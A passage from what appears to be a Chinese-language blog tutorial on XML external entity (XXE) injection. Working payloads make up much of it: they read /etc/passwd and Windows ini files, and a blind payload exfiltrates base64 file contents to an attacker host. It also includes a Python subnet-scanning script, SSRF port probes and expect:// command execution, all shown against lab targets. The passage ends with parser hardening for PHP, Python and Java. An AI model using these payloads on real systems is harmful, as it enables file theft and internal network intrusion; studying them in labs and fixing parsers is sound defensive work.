--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;normal;&lt;/message&gt;    &lt;!-- 引用一般实体 --&gt;</span><br></pre></td></tr></table></figure><p>参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML实体编码，否则会出现解析错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % outside &#x27;&lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;&#x27;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;files;&lt;/message&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h2><p>XXE即XML外部实体注入 。和sql注入一样，进行xml修改成恶意代码后，xml解析器解析了恶意代码造成XXE。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="方式一：-直接通过DTD外部实体声明"><a href="#方式一：-直接通过DTD外部实体声明" class="headerlink" title="方式一： 直接通过DTD外部实体声明"></a>方式一： 直接通过DTD外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;b;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="方式二：通过DTD文档引入外部DTD文档中的外部实体声明"><a href="#方式二：通过DTD文档引入外部DTD文档中的外部实体声明" class="headerlink" title="方式二：通过DTD文档引入外部DTD文档中的外部实体声明"></a>方式二：通过DTD文档引入外部DTD文档中的外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE Quan SYSTEM &quot;http://ip/eval.dtd&quot;&gt;</span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br><span class="line">#DTD文件内容：</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明"><a href="#方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明" class="headerlink" title="方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明"></a>方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Quan[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;http://ip/eval.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br><span class="line">#Quan.dtd的外部实体声明内容：</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="XXE的分类"><a href="#XXE的分类" class="headerlink" title="XXE的分类"></a>XXE的分类</h3><p>XXE分成了三类，正常回显XXE、报错XXE和Blind XXE</p><h4 id="一、有回显XXE"><a href="#一、有回显XXE" class="headerlink" title="一、有回显XXE"></a>一、有回显XXE</h4><p>示例：1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321181626275-495525002.png" alt="image-20220321181626389"></p><p>有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误，这时候就可以利用CDATA或者base64编码来绕过。</p><p>1.可以使用base64编码</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/system.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;file;&lt;/test&gt;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321181332551-263562990.png" alt="image-20220321181332580"></p><p>2.使用CDATA</p><p>CDATA的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"> </span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br><span class="line"> </span><br><span class="line">#evil.dtd</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321185953669-35570466.png" alt="image-20220321185953632"></p><h4 id="二、无回显XXE"><a href="#二、无回显XXE" class="headerlink" title="二、无回显XXE"></a>二、无回显XXE</h4><p>修改1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://IP:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://IP/evil.dtd&quot;&gt; </span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321190947948-229616586.png" alt="image-20220321190948041"></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321191019583-524554951.png" alt="image-20220321191019504"></p><h3 id="XXE的挖掘思路"><a href="#XXE的挖掘思路" class="headerlink" title="XXE的挖掘思路"></a>XXE的挖掘思路</h3><p>检测xml是否被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY dog &quot;this is dog&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;dog;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>检测是否支持外部实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % dog SYSTEM &quot;http://ip:9999&quot;&gt;</span><br><span class="line">%dog;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-lab-php"><a href="#xxe-lab-php" class="headerlink" title="xxe-lab-php"></a>xxe-lab-php</h2><h3 id="有回显XXE利用"><a href="#有回显XXE利用" class="headerlink" title="有回显XXE利用"></a>有回显XXE利用</h3><p>在登陆点抓一个包</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321204955541-1286779273.png" alt="image-20220321204955573"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;yang&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321205152255-555921104.png" alt="image-20220321205152237"></p><p>注意点必须要把获取的数据写入username标签，因为这里的输出是username标签的</p><h3 id="无回显XXE利用"><a href="#无回显XXE利用" class="headerlink" title="无回显XXE利用"></a>无回显XXE利用</h3><p>注释echo</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321205640958-468375062.png" alt="image-20220321205641054"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.31.144/test.dtd&quot;&gt; </span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.144:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321210105270-1223906708.png" alt="image-20220321210104852"></p><h3 id="内网存活主机扫描"><a href="#内网存活主机扫描" class="headerlink" title="内网存活主机扫描"></a>内网存活主机扫描</h3><p>可以读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件，这样我们就能拿到网段了</p><p>利用python2脚本探测存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"> </span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;</span><br><span class="line">    x = requests.post(&#x27;http://192.168.12.130/xxe-lab/php_xxe/doLogin.php&#x27;, data=xml, headers=headers, timeout=5).text</span><br><span class="line">    coded_string = x.split(&#x27; &#x27;)[-2] </span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(129, 135):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        #此处填写网段</span><br><span class="line">        ip = &#x27;192.168.12.&#x27; + i</span><br><span class="line">        string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure><p>结果，可以看到130主机在线</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321211044738-609924708.png" alt="image-20220321211043569"></p><h3 id="HTTP端口扫描"><a href="#HTTP端口扫描" class="headerlink" title="HTTP端口扫描"></a>HTTP端口扫描</h3><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;http://192.168.202.130:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;test;&lt;/login&gt;&lt;secret&gt;cc&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321211348356-1619415418.png" alt="image-20220321211348341"></p><p>后面放到Intruder中爆破即可，根据页面长度或响应时间</p><h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>payload，前提是要开启expect拓展</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE tets[</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;expect://执行的命令&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-lab-java"><a href="#xxe-lab-java" class="headerlink" title="xxe-lab-java"></a>xxe-lab-java</h2><p>搭建好之后，访问</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321213953926-1178940623.png" alt="image-20220321213953393"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;CC&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321214418859-1781890276.png" alt="image-20220321214418897"></p><p>ssrf-payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;CC&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321214655764-112584513.png" alt="image-20220321214655641"></p><h2 id="XXE修复"><a href="#XXE修复" class="headerlink" title="XXE修复"></a>XXE修复</h2><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p><p>使用正确的方法：</p><h3 id="代码层防范（PHP）"><a href="#代码层防范（PHP）" class="headerlink" title="代码层防范（PHP）"></a>代码层防范（PHP）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><h3 id="代码层防范（Python）"><a href="#代码层防范（Python）" class="headerlink" title="代码层防范（Python）"></a>代码层防范（Python）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><h3 id="代码层防范（Java）"><a href="#代码层防范（Java）" class="headerlink" title="代码层防范（Java）"></a>代码层防范（Java）</h3><p>使用 XML 库的 Java 应用程序特别容易受到 XXE  的攻击，因为大多数 Java XML 解析器的默认设置是启用 XXE。 要安全地使用这些解析器，您必须在您使用的解析器中显式禁用 XXE。 下面介绍如何在 Java 最常用的 XML 解析器中禁用 XXE。</p><p><strong>JAXP DocumentBuilderFactory、SAXParserFactory 和 DOM4J</strong></p><p><code>DocumentBuilderFactory,</code> <code>SAXParserFactory</code>和 <code>DOM4J</code> <code>XML</code>解析器可以使用相同的技术进行配置，以保护它们免受 XXE 的侵害。</p><p>只有 <code>DocumentBuilderFactory</code>此处提供了示例。JAXP <code>DocumentBuilderFactory</code> setFeature 方法允许开发人员控制启用或禁用哪些特定于实现的 XML 处理器功能。</p><p>这些功能既可以在工厂设置，也可以在底层设置 <code>XMLReader</code> setFeature 方法。</p><h4 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">import javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = null;</span><br><span class="line">try &#123;</span><br><span class="line">  FEATURE = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, true);</span><br><span class="line">  FEATURE = &quot;http://xml.org/sax/features/external-general-entities&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, false);</span><br><span class="line">  FEATURE = &quot;http://xml.org/sax/features/external-parameter-entities&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, false);</span><br><span class="line">  FEATURE = &quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, false);</span><br><span class="line">  dbf.setXIncludeAware(false);</span><br><span class="line">  dbf.setExpandEntityReferences(false);</span><br><span class="line">  logger.info(&quot;ParserConfigurationException was thrown. The feature &#x27;&quot; + FEATURE</span><br><span class="line">  + &quot;&#x27; is probably not supported by your XML processor.&quot;);</span><br><span class="line">  ...</span><br><span class="line">&#125; catch (SAXException e) &#123;</span><br><span class="line">  logger.warning(&quot;A DOCTYPE was passed into the XML document&quot;);</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">  logger.error(&quot;IOException occurred, XXE may still possible: &quot; + e.getMessage());</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">DocumentBuilder safebuilder = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><p>对于语法突出显示的示例代码片段，使用 <code>SAXParserFactory</code></p><h4 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import javax.xml.parsers.ParserConfigurationException;</span><br><span class="line">import javax.xml.parsers.SAXParser;</span><br><span class="line">import javax.xml.parsers.SAXParserFactory;</span><br><span class="line"></span><br><span class="line">import org.xml.sax.SAXNotRecognizedException;</span><br><span class="line">import org.xml.sax.SAXNotSupportedException;</span><br><span class="line">import org.xml.sax.XMLReader;</span><br><span class="line">  SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">  SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">  XMLReader reader = saxParser.getXMLReader();</span><br><span class="line">  try &#123;</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">  &#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">  &#125; catch (SAXNotRecognizedException e) &#123;</span><br><span class="line">  &#125; catch (SAXNotSupportedException e) &#123;</span><br><span class="line">  &#125; catch ... &#123;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>StAX 解析器，例如 <code>XMLInputFactory</code>允许设置各种属性和功能。保护 Java <code>XMLInputFactory</code>来自 XXE，请执行以下操作：</p><h4 id="xmlInputFactory"><a href="#xmlInputFactory" class="headerlink" title="xmlInputFactory"></a>xmlInputFactory</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);</span><br><span class="line">xmlInputFactory.setProperty(&quot;javax.xml.stream.isSupportingExternalEntities&quot;, false);</span><br></pre></td></tr></table></figure><p>Oracle DOM 解析器 ，遵循 Oracle 推荐， 例如：</p><h4 id="DOMParser"><a href="#DOMParser" class="headerlink" title="DOMParser"></a>DOMParser</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DOMParser domParser = new DOMParser();</span><br><span class="line">  domParser.setAttribute(DOMParser.EXPAND_ENTITYREF, false);</span><br><span class="line">  domParser.setAttribute(DOMParser.DTD_OBJECT, dtdObj);</span><br><span class="line">domParser.setAttribute(DOMParser.ENTITY_EXPANSION_DEPTH, 12);</span><br></pre></td></tr></table></figure><p>为了保护一个 <code>javax.xml.transform.TransformerFactory</code>来自 XXE，请执行以下操作：</p><h4 id="TransformerFactory"><a href="#TransformerFactory" class="headerlink" title="TransformerFactory"></a>TransformerFactory</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span><br></pre></td></tr></table></figure><p>为了保护一个 <code>javax.xml.validation.Validator</code>来自 XXE，请执行以下操作：</p><h4 id="validator"><a href="#validator" class="headerlink" title="validator"></a>validator</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span 